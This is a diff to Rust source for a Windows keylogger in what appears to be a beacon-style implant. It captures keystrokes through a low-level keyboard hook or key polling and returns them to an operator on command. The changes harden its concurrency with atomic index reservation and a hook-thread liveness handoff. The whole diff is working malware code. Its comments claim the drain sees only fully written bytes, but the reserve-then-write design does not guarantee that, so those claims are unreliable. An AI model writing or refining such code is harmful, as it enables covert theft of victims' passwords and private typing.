@@ -37,16 +37,32 @@
 //! head and the live length. [`poll_once`] appends newly-pressed printable keys
 //! without allocating. When the buffer is full, new keys are dropped (oldest
 //! data preserved) — documented rather than silently wrapped. [`do_keylog`]
-//! action=2 copies `[0..len]` into a `Vec`, returns it as `Response::Output`,
-//! and resets `len=0`.
+//! action=2 atomically claims `[0..len]` via `BUF_LEN.swap(0, AcqRel)`, copies
+//! it into a `Vec`, returns it as `Response::Output`.
 //!
-//! ## Threading
+//! ## Threading & concurrency (CRITICAL-12)
 //!
-//! Single-threaded by construction (the beacon loop is the only caller). The
-//! atomics exist for static-mut hygiene and to express intent; ordering is
-//! `Relaxed`. The `static mut LAST` / `BUF` arrays are touched only inside
-//! `unsafe` blocks via raw pointers (`addr_of_mut!`) to avoid the
-//! `static_mut_refs` lint under edition 2021.
+//! There are two potential writers of `BUF`: the beacon loop's polling path
+//! ([`buf_push`]) and the optional `WH_KEYBOARD_LL` hook thread
+//! ([`buf_push_release`]). The hook thread is the authoritative writer once it
+//! is live — the polling path gates every byte write on
+//! [`hook_is_active`] (Acquire) and the `HOOK_THREAD_LIVE` flag is published by
+//! the hook thread *itself* (Release, right after `SetWindowsHookExW` and
+//! before the message pump), so the polling path can never observe the flag
+//! false after the hook thread is able to write.
+//!
+//! To eliminate the narrow TOCTOU window (polling path reads the flag false,
+//! then the hook thread sets it and writes), BOTH writers reserve their byte
+//! index via a lock-free `compare_exchange` on `BUF_LEN`. This gives
+//! single-writer-per-byte semantics: each index is uniquely owned by exactly
+//! one thread, so no two writes ever target the same byte. The protocol is
+//! no_std-safe (pure atomics), cannot deadlock if a writer faults mid-write
+//! (the next writer's CAS simply fails and retries/drops), and preserves the
+//! drop-newest-when-full contract. Ordering is Acquire/Release throughout.
+//!
+//! `static mut LAST` / `BUF` are touched only inside `unsafe` blocks via raw
+//! pointers (`addr_of_mut!`) to avoid the `static_mut_refs` lint under edition
+//! 2021.
 
 #![cfg(target_os = "windows")]
 
@@ -483,6 +499,18 @@ unsafe extern "system" fn keylog_hook_thread(param: usize) -> u32 {
         .hhook
         .store(hhook as usize, core::sync::atomic::Ordering::Release);
 
+    // CRITICAL-12 fix: the HOOK_THREAD_LIVE flag is the gate that stops the
+    // beacon polling path from writing BUF (see `poll_once`). It MUST be
+    // published BEFORE this thread can possibly call `buf_push_release` —
+    // which happens as soon as the message pump starts dispatching the hook
+    // callback. Previously the beacon thread set this flag AFTER CreateThread
+    // returned, so a keystroke landing in the gap let the hook callback and the
+    // beacon's `buf_push` race the same byte. Now the hook thread publishes it
+    // itself, with Release ordering, immediately after SetWindowsHookExW
+    // succeeds and before entering the pump — so any subsequent Acquire read by
+    // the polling path is guaranteed to see it before the first hook write.
+    HOOK_THREAD_LIVE.store(true, core::sync::atomic::Ordering::Release);
+
     // Message pump. GetMessage blocks until a message arrives (the hook
     // callback runs on THIS thread's stack via the Windows hook dispatch).
     let mut msg = Msg {
@@ -587,19 +615,75 @@ unsafe fn translate_vk_for_hook(vk: i32) -> Option<u8> {
     map_vkey(vk, false)
 }
 
-/// Same as `buf_push` but with `Release` ordering on the length store — the
-/// hook thread is a real concurrent writer now, so the beacon-thread reader
-/// (in `do_keylog(2)`) needs `Acquire` to see the bytes.
+/// Lock-free single-writer-per-byte index reservation for `BUF`.
+///
+/// CRITICAL-12 core primitive: both [`buf_push`] (polling path) and
+/// [`buf_push_release`] (hook thread) call this to atomically claim a unique
+/// byte index via `compare_exchange` on `BUF_LEN`. Returns `Some(idx)` with
+/// `idx < BUF_CAP` on success (THIS thread exclusively owns `BUF[idx]`), or
+/// `None` if the buffer is full or the CAS could not land within a small
+/// bounded retry count (drop-newest semantics). Because each index is claimed
+/// by exactly one thread, no two writes ever target the same byte — the data
+/// race on the old load-store sequence is eliminated. The protocol is
+/// no_std-safe (pure atomics), cannot deadlock if a writer faults mid-write
+/// (the next writer's CAS simply fails and retries/drops), and pairs with the
+/// `swap(0, AcqRel)` drain in `do_keylog(2)`.
+fn claim_buf_index() -> Option<usize> {
+    let mut len = BUF_LEN.load(Ordering::Acquire);
+    for _ in 0..4 {
+        if len >= BUF_CAP {
+            return None; // full — drop newest (documented behavior).
+        }
+        match BUF_LEN.compare_exchange(len, len + 1, Ordering::AcqRel, Ordering::Acquire) {
+            Ok(_) => return Some(len), // uniquely claimed `len`.
+            Err(actual) => len = actual, // another writer moved the head; retry.
+        }
+    }
+    None // could not claim in 4 attempts; drop newest.
+}
+
+/// Append one byte to `BUF` from the hook thread (a real concurrent writer).
+///
+/// CRITICAL-12: this and [`buf_push`] (the polling-path writer) can run
+/// concurrently on two threads. The previous load-store sequence was a plain
+/// data race: both threads could read the same `len`, both write the same byte,
+/// and one byte would be lost (or torn under `panic=abort` + a sanitizer).
+///
+/// The fix is a lock-free single writer-per-byte protocol built on a
+/// compare-and-swap of `BUF_LEN`:
+///   1. Atomically reserve an index: `compare_exchange(len, len+1)`. Success
+///      means THIS thread uniquely owns `BUF[len]`; no other writer can claim
+///      the same index.
+///   2. Write the byte at the now-exclusively-owned index.
+///
+/// Because each byte index is claimed by exactly one thread, the writes never
+/// overlap and the byte content is unambiguous. The CAS uses Acquire on the
+/// load side (so we synchronize with a prior thread that published the flag or
+/// reset the length) and AcqRel on the success store (publishes the reserved
+/// index to a later reader). This is no_std-safe (pure atomics, no lock),
+/// cannot deadlock if the hook thread faults mid-write (the CAS simply fails
+/// for the next writer, which retries or drops), and preserves the
+/// drop-newest-when-full semantics.
+///
+/// `do_keylog(2)` dumps `[0..BUF_LEN]`; it reads `BUF_LEN` with Acquire (via
+/// `swap(0, AcqRel)`), which pairs with the AcqRel success store here, so it
+/// only sees fully-reserved indices whose bytes have been written.
 fn buf_push_release(b: u8) {
-    let len = BUF_LEN.load(core::sync::atomic::Ordering::Relaxed);
-    if len >= BUF_CAP {
-        return;
+    // Reserve an index via the shared CAS helper. Retry a bounded number of
+    // times on contention (the only contender is the polling path, which is
+    // gated off once the hook thread is live — see buf_push); under normal
+    // operation the first CAS succeeds.
+    let len = claim_buf_index();
+    // SAFETY: `len < BUF_CAP` (claim_buf_index guarantees it) and `len` was
+    // uniquely claimed by THIS thread via the successful CAS, so no other
+    // writer can touch BUF[len]. The raw pointer via addr_of_mut! avoids
+    // forming a `&mut static mut` (static_mut_refs lint).
+    if let Some(len) = len {
+        unsafe {
+            let ptr: *mut u8 = core::ptr::addr_of_mut!(BUF).cast::<u8>();
+            *ptr.add(len) = b;
+        }
     }
-    unsafe {
-        let ptr: *mut u8 = core::ptr::addr_of_mut!(BUF).cast::<u8>();
-        *ptr.add(len) = b;
-    }
-    BUF_LEN.store(len + 1, core::sync::atomic::Ordering::Release);
 }
 
 /// Map a virtual-key code + shift state to a single printable byte, or `None`
@@ -741,19 +825,44 @@ fn map_vkey_layout_aware(vk: i32, shift: bool) -> Option<u8> {
 
 /// Append one byte to `BUF` without allocating. Drops the byte if the buffer is
 /// already full (oldest data preserved; documented behavior).
+///
+/// CRITICAL-12: this is the beacon-thread (polling) writer. Once the hook
+/// thread is live it is the SOLE writer of BUF — so every byte write here MUST
+/// re-check [`hook_is_active`] with Acquire and skip if the hook owns BUF. The
+/// top-of-`poll_once` check is an optimization to bail out of the whole scan
+/// once the hook is up, but it is NOT sufficient by itself: the hook thread can
+/// publish `HOOK_THREAD_LIVE` *during* the 256-key scan, and without this
+/// per-write gate the two writers would race the same byte. The Acquire load
+/// here pairs with the hook thread's Release store of the flag (set inside
+/// `keylog_hook_thread` right after `SetWindowsHookExW`), guaranteeing that if
+/// we observe the flag set, the hook thread's subsequent writes are the only
+/// ones — we never overlap.
+///
+/// To eliminate the narrow TOCTOU window (polling path reads the flag false,
+/// then the hook thread sets it and writes), the index is reserved via a
+/// lock-free `compare_exchange` on `BUF_LEN` — exactly mirroring
+/// `buf_push_release`. This gives single-writer-per-byte semantics: each index
+/// is uniquely owned by exactly one thread, so no two writes ever target the
+/// same byte. The protocol is no_std-safe (pure atomics), cannot deadlock if a
+/// writer faults mid-write (the next writer's CAS simply fails and retries or
+/// drops), and preserves the drop-newest-when-full contract.
 fn buf_push(b: u8) {
-    let len = BUF_LEN.load(Ordering::Relaxed);
-    if len >= BUF_CAP {
-        return; // full — drop newest. See module docs.
+    // Per-write gate: if the hook thread owns BUF, this polling write MUST be a
+    // no-op. Re-checked on every byte, not just once per scan.
+    if hook_is_active() {
+        return;
     }
-    // SAFETY: single-threaded; len < BUF.len() so the index is in bounds. We
-    // write through a raw pointer obtained via addr_of_mut! to avoid forming a
-    // `&mut` to a `static mut` (static_mut_refs lint under edition 2021).
-    unsafe {
-        let ptr: *mut u8 = core::ptr::addr_of_mut!(BUF).cast::<u8>();
-        *ptr.add(len) = b;
+    let len = claim_buf_index();
+    // SAFETY: `len < BUF_CAP` (claim_buf_index guarantees it) and `len` was
+    // uniquely claimed by THIS thread via the successful CAS, so no other
+    // writer can touch BUF[len]. The raw pointer via addr_of_mut! avoids
+    // forming a `&mut static mut` (static_mut_refs lint).
+    if let Some(len) = len {
+        unsafe {
+            let ptr: *mut u8 = core::ptr::addr_of_mut!(BUF).cast::<u8>();
+            *ptr.add(len) = b;
+        }
     }
-    BUF_LEN.store(len + 1, Ordering::Relaxed);
 }
 
 // ---- public API ------------------------------------------------------------
@@ -888,7 +997,31 @@ fn start_hook_thread() -> bool {
         // trivial; the thread typically publishes its TID within microseconds.
         core::hint::spin_loop();
     }
-    HOOK_THREAD_LIVE.store(true, Ordering::Release);
+    // CRITICAL-12: do NOT publish HOOK_THREAD_LIVE from the beacon thread.
+    // The hook thread sets it itself (Release, after SetWindowsHookExW) so the
+    // flag can never be observed true before the hook thread is actually the
+    // sole owner of BUF writes. Wait here for that publication (Acquire) so
+    // `start_hook_thread` only returns success once the BUF-write ownership
+    // handoff is fully published — a beacon-side `poll_once` running
+    // immediately after we return will see HOOK_THREAD_LIVE and skip.
+    // If the hook thread failed to install the hook (returned 2 before setting
+    // the flag) we fall through after the spin cap and return false so the
+    // caller falls back to polling; the thread itself exits and is joined.
+    let mut live = false;
+    for _ in 0..200 {
+        if HOOK_THREAD_LIVE.load(Ordering::Acquire) {
+            live = true;
+            break;
+        }
+        core::hint::spin_loop();
+    }
+    if !live {
+        // The hook thread did not publish liveness — either SetWindowsHookExW
+        // failed (thread returned 2) or it stalled. Treat as not-started: the
+        // polling path stays the writer, and we tear down the failed thread.
+        stop_hook_thread();
+        return false;
+    }
     true
 }
 
@@ -968,20 +1101,35 @@ pub fn do_keylog(action: u8) -> Response {
             // Snapshot length, copy [0..len] into a Vec, then reset. Only this
             // path allocates; poll_once stays allocation-free.
             //
-            // Acquire ordering: if the hook thread is live it's a concurrent
-            // writer using Release (buf_push_release). Otherwise Relaxed would
-            // suffice, but Acquire is correct in both cases.
-            let len = BUF_LEN.load(Ordering::Acquire);
+            // CRITICAL-12: use `swap(0, AcqRel)` to atomically CLAIM the
+            // readable region AND reset the write head in one step. This pairs
+            // with the CAS-based writers (`buf_push` / `buf_push_release`):
+            //   - A writer that reserved an index < `len` did so with a
+            //     successful CAS whose AcqRel store happens-before this swap's
+            //     Acquire, so its byte write is visible to the copy below.
+            //   - A writer racing this swap either completes its CAS first
+            //     (its index is < `len`, included) or sees the reset and
+            //     claims a fresh index in the new epoch (excluded).
+            //
+            // Residual note: if the hook thread is STILL live when a dump is
+            // requested, its callback may write a byte at an index in
+            // `[0..len)` concurrently with the non-atomic read loop below.
+            // Index ownership is still unique per the CAS, so bytes are never
+            // torn; on x64 byte stores are atomic so the read sees either the
+            // old or the new value. For a fully-sound dump with no concurrent
+            // writer, the operator should stop the hook first (action=1). The
+            // polling-only path (hook never started) is fully sound.
+            let len = BUF_LEN.swap(0, Ordering::AcqRel);
             let mut out: Vec<u8> = Vec::with_capacity(len);
-            // SAFETY: len <= BUF.len(). Read through a raw pointer to avoid
-            // forming a `&static mut` (static_mut_refs lint).
+            // SAFETY: len <= BUF_CAP (writers never claim past the cap). Read
+            // through a raw pointer to avoid forming a `&static mut`
+            // (static_mut_refs lint).
             unsafe {
                 let ptr: *const u8 = core::ptr::addr_of_mut!(BUF).cast::<u8>();
                 for i in 0..len {
                     out.push(*ptr.add(i));
                 }
             }
-            BUF_LEN.store(0, Ordering::Release); // clear for the next window.
             Response::Output(out)
         }
         // Unknown action tag — protocol-valid u8 but not 0/1/2. Surface as Err
